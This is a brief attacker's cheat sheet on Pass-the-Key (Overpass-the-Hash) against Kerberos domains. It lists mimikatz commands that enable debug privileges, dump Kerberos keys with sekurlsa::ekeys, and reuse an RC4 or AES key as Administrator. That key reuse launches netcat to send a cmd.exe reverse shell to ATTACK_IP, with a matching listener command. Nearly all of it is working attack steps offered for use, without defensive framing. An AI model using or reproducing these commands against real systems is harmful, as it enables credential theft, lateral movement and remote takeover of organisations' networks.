## Similar to PtH but applied to kerberos networks.

### If we have any of those keys (DES,RC4,AES128,AES256) we can ask the KDC for a TGT without requiring the actual password. (Pass-the-Key)

#### privilege::debug

#### sekurlsa::ekeys

#### sekurlsa::pth /user:Administrator /domain:DOMAIN /rc4:KEY /run:"c:\tools\nc64.exe -e cmd.exe ATTACK_IP PORT"

#### /aes128:KEY can also be used instead 

#### /aes256:KEY can also be used instead 

#### nc -lvp PORT
